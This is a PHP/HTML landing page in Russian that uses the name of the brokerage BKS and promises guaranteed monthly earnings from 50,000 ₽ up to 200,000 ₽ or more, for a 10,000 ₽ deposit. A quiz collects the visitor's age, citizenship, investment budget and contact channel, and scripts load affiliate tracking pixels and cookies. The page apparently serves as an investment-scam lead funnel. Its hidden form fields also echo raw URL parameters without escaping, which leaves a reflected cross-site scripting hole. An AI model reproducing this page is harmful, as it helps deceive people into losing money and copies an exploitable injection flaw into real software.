<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>
<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>БКС</title>
    <link rel="stylesheet" href="./assets/css/normalize.css" />
    <link rel="stylesheet" href="./assets/css/styles.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,100..700;1,100..700&display=swap"
      rel="stylesheet"
    />
    <link rel="shortcut icon" href="./assets/img/fav.svg" type="image/x-icon" />

    <script src="form/js/libs/intlTelInput.js"></script>

    <script>
      let scriptLoadings = false;
      // Функция для получения значения параметра из URL
      function getUrlParam(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
      }

      // Проверяем наличие параметров
      const bgeValue = getUrlParam("bge");
      const crmSource = getUrlParam("crm_source");

      if (bgeValue) {
        // Если есть только bgeValue – подключаем скрипты для bge
        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() { bgdataLayer.push(arguments); }
      bge('init', '${bgeValue}');
    `;
        document.head.appendChild(inlineScript);

        // Подключаем второй скрипт для bge
        let asyncScript = document.createElement("script");
        asyncScript.src =
          "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
        document.head.appendChild(asyncScript);

        // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
        asyncScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
          console.log("Все скрипты для BGE загружены!");
        };
      } else if (!crmSource) {
        // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
        let trackScript = document.createElement("script");
        trackScript.type = "application/javascript";
        trackScript.src = "track.js?v=21238";
        document.head.appendChild(trackScript);

        trackScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки track.js
          console.log("track.js загружен!");
          window.removeEventListener("beforeunload", trackClose);
        };

        let inlineScript = document.createElement("script");
        inlineScript.innerHTML = `
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}"
      };
    `;
        document.head.appendChild(inlineScript);

        inlineScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
          console.log("Inline script для альтернативы загружен!");
        };

        let parseScript = document.createElement("script");
        parseScript.type = "application/javascript";
        parseScript.src = "parse_url.js?v=19";
        document.head.appendChild(parseScript);

        scriptLoadings = true;

        parseScript.onload = function () {
          // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
          console.log("parse_url.js загружен!");
        };
      }
    </script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
  </head>
  <body>
    <header class="header">
      <img src="./assets/img/logo.svg" alt="Logo" />
    </header>
    <main class="main">
      <div class="main__banner">
        <img src="./assets/img/main.png" alt="Image" />
      </div>
      <div class="main__wrapper">
        <h2 class="main__heading">
          Начни зарабатывать уже сегодня - без опыта и сложностей!
        </h2>
        <ul class="main__content">
          <li class="content__item">
            <span class="accent">БКС приносит:</span>
          </li>
          <li class="content__item">
            от <span class="accent">50 000 ₽</span> в первый месяц
          </li>
          <li class="content__item">
            от <span class="accent">100 000 ₽</span> во второй месяц
          </li>
          <li class="content__item">
            от <span class="accent">200 000 ₽</span> с третьего месяц
          </li>
        </ul>
        <button type="button" class="main__button">Начать зарабатывать</button>
        <ul class="main__list">
          <li class="list__item">Проверено тысячами участников!</li>
          <li class="list__item">Вывод доступен с первого дня</li>
          <li class="list__item">
            Минимальный депозит 10 000 ₽ и первый заработок уже в день
            регистрации
          </li>
        </ul>
      </div>
      <div class="screen__wrapper hidden">
        <div class="screen main__age hidden" id="quiz1">
          <div class="modal__content quiz">
            <img src="./assets/img/logo_s.svg" alt="Logo" />
            <h2 class="quiz__heading">Сколько Вам лет?</h2>
            <div class="quiz__items">
              <a href="err.html" class="quiz__item"> До 21 </a>
              <button type="button" class="quiz__item age">21-35</button>
              <button type="button" class="quiz__item age">36-50</button>
              <button type="button" class="quiz__item age">50 +</button>
            </div>
          </div>
        </div>
        <div class="screen main__citizen hidden" id="quiz2">
          <div class="modal__content quiz">
            <img src="./assets/img/logo_s.svg" alt="Logo" />
            <h2 class="quiz__heading">
              Вы являетесь гражданином Российской Федерации?
            </h2>
            <div class="quiz__items">
              <button type="button" class="quiz__item citizen">Да</button>
              <a href="err.html" class="quiz__item"> Нет </a>
            </div>
          </div>
        </div>
        <div class="screen main__goal hidden" id="quiz3">
          <div class="modal__content quiz">
            <img src="./assets/img/logo_s.svg" alt="Logo" />
            <h2 class="quiz__heading">
              С какой суммы Вы готовы начать сотрудничество с БКС?
            </h2>
            <div class="quiz__items">
              <button type="button" class="quiz__item goal">
                10 000 ₽ - 20 000 ₽
              </button>
              <button type="button" class="quiz__item goal">
                20 000 ₽ - 50 000 ₽
              </button>
              <button type="button" class="quiz__item goal">
                50 000 ₽ - 100 000 ₽
              </button>
              <button type="button" class="quiz__item goal">100 000 ₽+</button>
            </div>
          </div>
        </div>
        <div class="screen main__experience hidden" id="quiz4">
          <div class="modal__content quiz">
            <h2 class="quiz__heading">
              Как лучше всего с Вами связаться? (выберите один)
            </h2>
            <div class="quiz__items">
              <button type="button" class="quiz__item expr">WhatsApp</button>
              <button type="button" class="quiz__item expr">Telegram</button>
              <button type="button" class="quiz__item expr">
                Мобильный телефон
              </button>
            </div>
          </div>
        </div>
        <div class="screen main__profit hidden" id="quiz5">
          <div class="modal__content quiz">
            <h2 class="quiz__heading">
              Средний доход участника в програме от БКС начинаеться от 128 340 ₽
              и может достигать 1 000 000 ₽. Сколько вы хотите зарабатывать?
            </h2>
            <div class="quiz__items">
              <button type="button" class="quiz__item profit">
                50 000 ₽ - 125 000 ₽
              </button>
              <button type="button" class="quiz__item profit">
                125 000 ₽ - 250 000 ₽
              </button>
              <button type="button" class="quiz__item profit">
                250 000 ₽ - 400 000 ₽
              </button>
              <button type="button" class="quiz__item profit">
                400 000 ₽+
              </button>
            </div>
          </div>
        </div>
        <div class="screen main__form-wrap hidden" id="form-screen">
          <div class="modal__content quiz form">
            <form
              class="form _main-form contact-form freg thin rounded"
              id="main-form"
              method="post"
            >
              <div class="text-block-6">
                <h2 class="form-heading" style="text-align: center">
                  Оставь заявку и начни зарабатывать уже сегодня!
                </h2>
              </div>
              <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
              <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
              <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'>
              <input type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
              type="hidden" id="source" value='<?= $_GET['source'] ?>'>
            </form>
          </div>
        </div>
      </div>
    </main>
    <script src="./assets/js/main.js"></script>
    <script src="loadAssets.js?v=321"></script>

    <script>
      window.onload = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks2.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
